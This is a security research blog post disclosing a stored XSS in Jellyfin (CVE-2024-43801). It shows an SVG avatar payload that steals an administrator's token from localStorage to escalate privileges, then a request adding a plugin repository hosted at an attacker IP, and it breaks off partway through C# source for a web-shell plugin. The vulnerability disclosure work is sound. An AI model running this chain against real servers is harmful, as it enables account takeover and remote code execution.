<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="CVE-2024-43801 - Jellyfin XSS" />
<meta property="og:locale" content="en" />
<meta name="description" content="Jellyfin XSS" />
<meta property="og:description" content="Jellyfin XSS" />
<link rel="canonical" href="https://happy-little-accidents.pages.dev/posts/CVE-2024-43801/" />
<meta property="og:url" content="https://happy-little-accidents.pages.dev/posts/CVE-2024-43801/" />
<meta property="og:site_name" content="Happy Little Accidents!" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-09-01T21:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="CVE-2024-43801 - Jellyfin XSS" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-09-01T21:00:00+00:00","datePublished":"2024-09-01T21:00:00+00:00","description":"Jellyfin XSS","headline":"CVE-2024-43801 - Jellyfin XSS","mainEntityOfPage":{"@type":"WebPage","@id":"https://happy-little-accidents.pages.dev/posts/CVE-2024-43801/"},"url":"https://happy-little-accidents.pages.dev/posts/CVE-2024-43801/"}</script>
<!-- End Jekyll SEO tag -->


  <title>CVE-2024-43801 - Jellyfin XSS | Happy Little Accidents!
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Happy Little Accidents!">
<meta name="application-name" content="Happy Little Accidents!">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.2/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.27.20/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- JavaScript -->

  
    <!-- Switch the mode between dark and light. -->

<script type="text/javascript">
  class ModeToggle {
    static get MODE_KEY() {
      return 'mode';
    }
    static get MODE_ATTR() {
      return 'data-mode';
    }
    static get DARK_MODE() {
      return 'dark';
    }
    static get LIGHT_MODE() {
      return 'light';
    }
    static get ID() {
      return 'mode-toggle';
    }

    constructor() {
      let self = this;this.sysDarkPrefers.addEventListener('change', () => {
        if (self.hasMode) {
          self.clearMode();
        }
        self.notify();
      });

      if (!this.hasMode) {
        return;
      }

      if (this.isDarkMode) {
        this.setDark();
      } else {
        this.setLight();
      }
    }

    get sysDarkPrefers() {
      return window.matchMedia('(prefers-color-scheme: dark)');
    }

    get isPreferDark() {
      return this.sysDarkPrefers.matches;
    }

    get isDarkMode() {
      return this.mode === ModeToggle.DARK_MODE;
    }

    get hasMode() {
      return this.mode != null;
    }

    get mode() {
      return sessionStorage.getItem(ModeToggle.MODE_KEY);
    }get modeStatus() {
      if (this.hasMode) {
        return this.mode;
      } else {
        return this.isPreferDark ? ModeToggle.DARK_MODE : ModeToggle.LIGHT_MODE;
      }
    }

    setDark() {
      document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      document.documentElement.removeAttribute(ModeToggle.MODE_ATTR);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }notify() {
      window.postMessage(
        {
          direction: ModeToggle.ID,
          message: this.modeStatus
        },
        '*'
      );
    }

    flipMode() {
      if (this.hasMode) {
        this.clearMode();
      } else {
        if (this.isPreferDark) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.notify();
    }
  }

  const modeToggle = new ModeToggle();
</script>

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/commons/HappyLittleAccidents.webp" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <h1 class="site-title">
      <a href="/">Happy Little Accidents!</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Research blog for the Accidents team</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
    

    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>CVE-2024-43801 - Jellyfin XSS</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>CVE-2024-43801 - Jellyfin XSS</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1725224400"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Sep  1, 2024
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                Jack Moran (itz-d0dgy)
                </em>, <em>
              
                Elf Eldridge (Kaiwhata)
                
              
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="1968 words"
>
  <em>10 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  <div class="content">
    <h1 id="jellyfin-xss">Jellyfin XSS</h1>

<p>TL;DR - Jellyfin deployments using versions <code class="language-plaintext highlighter-rouge">10.9.9</code> or lower are vulnerable to stored <a href="https://github.com/jellyfin/jellyfin/security/advisories/GHSA-vcmh-9wx9-rfqh">XSS</a> which allowed privilege escalation to a platform administrator and ultimately to arbitrary code execution on the host. Fun for the whole family!</p>

<h1 id="technical-details">Technical details</h1>
<h2 id="what-is-it"><span class="me-2">What is it?</span><a href="#what-is-it" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Jellyfin is a media content management system that allows storage and access to media from a variety of devices. It’s a great alternative to things like <a href="https://www.plex.tv/">Plex</a> and <a href="https://emby.media/">Emby</a>. The usage model is that any user can set up a Jellyfin on their device - and then they can then invite other users to browse their content through a system of invites. Invites only grant users access to specific libraries and content, and shouldn’t be able to view or adjust the site settings (unless their account is elevated to an administrator).</p>

<p>Now you’re probably thinking (because the above text is a copy-paste of our Emby post)… isn’t this the same as our recent Emby CVE, <a href="https://happy-little-accidents.pages.dev/posts/CVE-2024-30931/">which you can read about here…</a>?</p>

<p><a href="/commons/well_yes_but_actually_no.webp" class="popup img-link  shimmer"><img src="/commons/well_yes_but_actually_no.webp" alt="Well Yes But No Meme" loading="lazy"></a></p>

<p>Jellyfin is a fork of Emby and shares some similarities in their code bases. However, unlike Emby, there was more fun to be had with this XSS!</p>

<p>So, much like Jellyfin forking from Emby, we are going to fork our Emby write-up for this write-up.</p>

<h2 id="what-was-wrong"><span class="me-2">What was wrong?</span><a href="#what-was-wrong" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>When interacting with the application we found that Jellyfin <code class="language-plaintext highlighter-rouge">10.8.13</code> allowed all users to personalise their profiles (Yay!) via the form of avatar images. This included support for SVG files. As is often the case, however, we found that there was insufficient validation on SVG file uploads, which made it vulnerable to abuse by including malicious JavaScript.</p>

<p>We created the following JavaScript payload and uploaded it to the server as a profile picture titled: “not-xss-i-swear.svg”.</p>

<div class="language-xml highlighter-rouge"><div class="code-header">
        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" standalone="no"?&gt;</span>
<span class="cp">&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;</span>
<span class="nt">&lt;svg</span> <span class="na">version=</span><span class="s">"1.1"</span> <span class="na">baseProfile=</span><span class="s">"full"</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/2000/svg"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;polygon</span> <span class="na">id=</span><span class="s">"triangle"</span> <span class="na">points=</span><span class="s">"0,0 0,50 50,0"</span> <span class="na">fill=</span><span class="s">"#009900"</span> <span class="na">stroke=</span><span class="s">"#004400"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;script</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    alert("2")
  <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/svg&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Uploading a profile image involves a single POST request with the image base64 encoded in the POST body. For example:</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/Users/d420c356f7db4874bcbf94016ebe1529/Images/Primary</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">X-Emby-Authorization</span><span class="p">:</span> <span class="s">"MediaBrowser Client='Jellyfin Web', Token=[TOKEN HERE]"</span>
<span class="na">X-Content-Type</span><span class="p">:</span> <span class="s">image/svg+xml</span>
<span class="s">[SNIP]</span>

PD94bWwgdmVyc2lvbj0iMS4wIiBzdGFuZGFsb25lPSJubyI/Pgo8IURPQ1RZUEUgc3ZnIFBVQkxJQyAiLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQiPgo8c3ZnIHZlcnNpb249IjEuMSIgYmFzZVByb2ZpbGU9ImZ1bGwiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CiAgPHBvbHlnb24gaWQ9InRyaWFuZ2xlIiBwb2ludHM9IjAsMCAwLDUwIDUwLDAiIGZpbGw9IiMwMDk5MDAiIHN0cm9rZT0iIzAwNDQwMCIvPgogIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KICAgIGFsZXJ0KCIyIikKICA8L3NjcmlwdD4KPC9zdmc+
</pre></td></tr></tbody></table></code></div></div>

<p>That simple <code class="language-plaintext highlighter-rouge">alert("2")</code> gives us some stored XSS whenever our profile picture is viewed directly. Note the <code class="language-plaintext highlighter-rouge">d420c356f7db4874bcbf94016ebe1529</code> in the URL of the POST request, this is the ID of our current user that we are uploading our profile picture to, this ID will come in handy later down the track.</p>

<h2 id="so-what"><span class="me-2">So what?</span><a href="#so-what" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Remember earlier how we mentioned the Jellyfin is a fork of Emby? Well much like was the case with Emby, at the moment exploiting this vulnerability is pretty pointless - sure you could inject some JavaScript or HTML and make the page look a bit funky - but not much else.</p>

<p>But, given that Emby was doing odd things with authentication and authorization, we wondered if Jellyfin was too.</p>

<p>Turns out it’s the same as <a href="https://happy-little-accidents.pages.dev/posts/CVE-2024-30931/">Emby</a> - which means all authenticated users use an <code class="language-plaintext highlighter-rouge">X-Emby-Authorization</code> token that’s stored in local storage instead of as a cookie.</p>

<p><a href="/commons/Dejavu.webp" class="popup img-link  shimmer"><img src="/commons/Dejavu.webp" alt="Déjà vu Simpsons Meme" loading="lazy"></a></p>

<p>As the token is stored in local storage as part of the <code class="language-plaintext highlighter-rouge">jellyfin_credentials</code> item, we can access the value of that token using client-side JavaScript in our XSS. The JavaScript to retrieve the token looks something like this:</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nx">token</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">localStorage</span><span class="p">.</span><span class="nf">getItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">jellyfin_credentials</span><span class="dl">"</span><span class="p">)).</span><span class="nx">Servers</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">AccessToken</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>But still, retrieving our token isn’t much to get excited about - after all we already have it! But if we were able to retrieve someone else’s token, we might be able to perform actions as that user!</p>

<h2 id="the-second-phase"><span class="me-2">The second phase</span><a href="#the-second-phase" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Once again, much like Emby, as part of the administrative functionality, administrators can elevate the privileges of any other user on the platform by making a POST request to <code class="language-plaintext highlighter-rouge">/Users/&lt;USER-ID&gt;/Policy</code>, with the payload <code class="language-plaintext highlighter-rouge">{"IsAdministrator":true}</code>. This is where the aforementioned ID comes in handy.</p>

<p>Elevating the user above (as an example) would be a single POST request with the following body:</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/Users/&lt;USER-ID&gt;/Policy</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">X-Emby-Authorization</span><span class="p">:</span> <span class="s">"MediaBrowser Client='Jellyfin Web', Token="+token</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="s">[SNIP]</span>

<span class="p">{</span><span class="w">
  </span><span class="nl">"IsAdministrator"</span><span class="p">:</span><span class="kc">true</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Putting all this together, all we need to do is to replace our original stored XSS payload with the following payload, which defines and executes custom JavaScript to retrieve the token and then submit a POST request using it (but replacing the <code class="language-plaintext highlighter-rouge">&lt;USER-ID&gt;</code> in <code class="language-plaintext highlighter-rouge">/Users/&lt;UserId&gt;/Policy</code> with the <code class="language-plaintext highlighter-rouge">&lt;USER-ID&gt;</code> of our user):</p>

<div class="language-xml highlighter-rouge"><div class="code-header">
        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" standalone="no"?&gt;</span>
<span class="cp">&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;</span>
<span class="nt">&lt;svg</span> <span class="na">version=</span><span class="s">"1.1"</span> <span class="na">baseProfile=</span><span class="s">"full"</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/2000/svg"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;polygon</span> <span class="na">id=</span><span class="s">"triangle"</span> <span class="na">points=</span><span class="s">"0,0 0,50 50,0"</span> <span class="na">fill=</span><span class="s">"#009900"</span> <span class="na">stroke=</span><span class="s">"#004400"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;script</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    var token = JSON.parse(localStorage.getItem("jellyfin_credentials")).Servers[0].AccessToken;
    var xhttp_priv_esc = new XMLHttpRequest();
    xhttp_priv_esc.open("POST", "/Users/d420c356f7db4874bcbf94016ebe1529/Policy", true);
    xhttp_priv_esc.setRequestHeader("Content-type", "application/json");
    xhttp_priv_esc.setRequestHeader("X-Emby-Authorization", "MediaBrowser Client='Jellyfin Web', Token="+token);
    xhttp_priv_esc.send(JSON.stringify({"IsAdministrator":true}));
  <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/svg&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Uploading the SVG and browsing to it currently does nothing, as our user doesn’t have permission to elevate users to administrators. However, the payload triggers when ANY user views your profile picture directly… All we need to do now is to get any Jellyfin user with administrator permissions to visit our profile picture and our payload will retrieve their token and use it to make our user an administrator of the site!</p>

<p>So, we could just wait for someone to right-click and “open in new tab/window”… Or, we could just copy the URL and send the administrator our cool new picture! The URL for the profile picture looks something like this:</p>

<p><code class="language-plaintext highlighter-rouge">https://jellyfin.redacted/Users/d420c356f7db4874bcbf94016ebe1529/Images/Primary?tag=9f12c97acf60573d151a2ac277a8d1ce&amp;quality=90</code></p>

<h2 id="hang-on-you-said-this-was-different"><span class="me-2">Hang on, you said this was different!</span><a href="#hang-on-you-said-this-was-different" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Now, an old <a href="https://xcancel.com/ss2342/status/1619825316301783041"><del>snowman</del></a> colleague once said to me that “XSS is not a real bug”. He was also famous for one-liners like “Yeah, but did you shell it?” So we decided to use this opportunity to show the impact XSS could have on a system, well by shelling the hell out of it!</p>

<p>Unlike Emby, Jellyfin offers a way for administrators to install plugins through the administrator dashboard. Now, I hear you, this is intended administrator functionality you’re saying, but a shell is a shell is it not? And in any case, granting a user admin credentials on a web server shouldn’t necessarily equate to also giving that user permission to execute arbitrary commands on the host.</p>

<p>Adding a repository is as simple as adding a JSON object, containing the repository <code class="language-plaintext highlighter-rouge">Name</code>, <code class="language-plaintext highlighter-rouge">Url</code>, and marking <code class="language-plaintext highlighter-rouge">Enabled</code> as true, on a happy little POST request to <code class="language-plaintext highlighter-rouge">/Repositories</code>:</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/Repositories</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">X-Emby-Authorization</span><span class="p">:</span> <span class="s">"MediaBrowser Client='Jellyfin Web', Token="+token</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="s">[SNIP]</span>

<span class="p">[</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"Name"</span><span class="p">:</span><span class="s2">"Jellyfin Stable"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Url"</span><span class="p">:</span><span class="s2">"https://repo.jellyfin.org/releases/plugin/manifest-stable.json"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Enabled"</span><span class="p">:</span><span class="kc">true</span><span class="w">
  </span><span class="p">},{</span><span class="w">
    </span><span class="nl">"Name"</span><span class="p">:</span><span class="s2">"RCE"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Url"</span><span class="p">:</span><span class="s2">"http://192.168.6.213:8000/manifest.json"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Enabled"</span><span class="p">:</span><span class="kc">true</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>All we need is a repository to add… So by following Jellyfin’s documentation on their <a href="https://github.com/jellyfin/jellyfin-plugin-template">GitHub page</a>, conveniently labelled:</p>

<blockquote>
  <p>So you want to make a Jellyfin plugin</p>
</blockquote>

<p><a href="https://github.com/itz-d0dgy">itz-d0dgy</a> sets out to write a malicious plugin!</p>

<p><a href="/commons/itz-d0dgy_lets_cook.webp" class="popup img-link  shimmer"><img src="/commons/itz-d0dgy_lets_cook.webp" alt="Lets Cook Meme" loading="lazy"></a></p>

<p>Queue a montage of a lot of finagling, multiple stupid C# moments, the temptation to blame <code class="language-plaintext highlighter-rouge">.NET</code> for all my problems, and thanking <a href="https://github.com/tcfox">TC</a> for teaching itz-d0dgy what little <code class="language-plaintext highlighter-rouge">.NET</code> he does know! We ended up with the following for our malicious plugin:</p>

<div class="language-c# highlighter-rouge"><div class="code-header">
        <span data-label-text="C#"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre></td><td class="rouge-code"><pre><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Net</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Diagnostics</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">Microsoft.AspNetCore.Mvc</span><span class="p">;</span>

<span class="k">namespace</span> <span class="nn">JellyfinRCE</span><span class="p">;</span>

<span class="k">public</span> <span class="k">class</span> <span class="nc">JellyfinRCE</span> <span class="p">:</span> <span class="n">ControllerBase</span> <span class="p">{</span>
    
  <span class="p">[</span><span class="nf">HttpGet</span><span class="p">(</span><span class="s">"/api/super_secret_web_shell/{command}"</span><span class="p">)]</span>
  <span class="k">public</span> <span class="n">IActionResult</span> <span class="nf">shell</span><span class="p">(</span><span class="kt">string</span> <span class="n">command</span><span class="p">){</span>

    <span class="kt">var</span> <span class="n">new_process</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">Process</span><span class="p">();</span>
    <span class="n">new_process</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">FileName</span> <span class="p">=</span> <span class="nf">OSCheck</span><span class="p">();</span>
    <span class="n">new_process</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">Arguments</span> <span class="p">=</span> <span class="s">$"-c \"</span><span class="p">{</span><span class="n">command</span><span class="p">}</span><span class="s">\""</span><span class="p">;</span>
    <span class="n">new_process</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">UseShellExecute</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
